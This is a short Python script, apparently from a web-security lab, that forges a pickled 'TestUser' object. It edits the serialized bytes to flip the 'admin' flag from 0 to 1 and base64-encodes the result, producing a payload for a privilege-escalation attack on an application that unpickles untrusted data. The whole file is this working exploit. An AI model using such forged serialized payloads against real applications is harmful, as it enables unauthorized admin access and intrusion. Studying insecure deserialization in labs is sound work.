import base64

# Base64 encoded string
# encoded_string = "gASVNAAAAAAAAACMEmludHJvZHVjdGlvbi52aWV3c5SMCFRlc3RVc2VylJOUKYGUfZSMBWFkbWlulEsAc2Iu"

# # Decoding the Base64 encoded string
# decoded_bytes = base64.b64decode(encoded_string)
exploit_decoded_bytes = b'\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x12introduction.views\x94\x8c\x08TestUser\x94\x93\x94)\x81\x94}\x94\x8c\x05admin\x94K\x01sb.'
encoded_bytes = base64.b64encode(exploit_decoded_bytes)
print(encoded_bytes)